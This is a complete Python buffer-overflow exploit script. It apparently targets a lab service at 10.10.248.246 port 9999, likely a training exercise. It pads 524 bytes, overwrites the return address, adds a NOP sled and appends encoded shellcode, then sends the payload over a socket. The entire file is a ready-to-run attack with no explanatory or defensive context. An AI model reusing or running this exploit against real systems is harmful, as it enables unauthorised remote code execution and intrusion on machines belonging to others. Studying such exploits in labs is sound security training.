#! /usr/bin/python3
import socket
import time



offset = 524
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xf3\x12\x17\x31")
num_nop_bytes = 100
nop_sled = bytearray(b"\x90"*num_nop_bytes)
shell_code = (
    b"\xdb\xc8\xb8\x2f\x24\x4a\xc9\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
    b"\x12\x83\xeb\xfc\x31\x43\x13\x03\x6c\x37\xa8\x3c\x43\xec\xdb"
    b"\x5c\xf0\x51\x77\xc9\xf4\xdc\x96\xbd\x9e\x13\xd8\x2d\x07\x1c"
    b"\xe6\x9c\x37\x15\x60\xe6\x5f\xac\x83\x3e\xa6\xd8\xa1\x3e\xc2"
    b"\x12\x2f\xdf\x42\x44\x7f\x71\xf1\x3a\x7c\xf8\x14\xf1\x03\xa8"
    b"\xbe\x64\x2b\x3e\x56\x11\x1c\xef\xc4\x88\xeb\x0c\x5a\x18\x65"
    b"\x33\xea\x95\xb8\x34"
)

buffer = junk_data + return_address + nop_sled + shell_code
host = "10.10.248.246"
port = 9999

def sendData(buffer, host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print(f"Data received from server: {csocket.recv(1024).decode('ascii')}")        
        csocket.send(buffer)


sendData(buffer, host, port)


# Bad chars: 0x00, 0x0a, 0x0d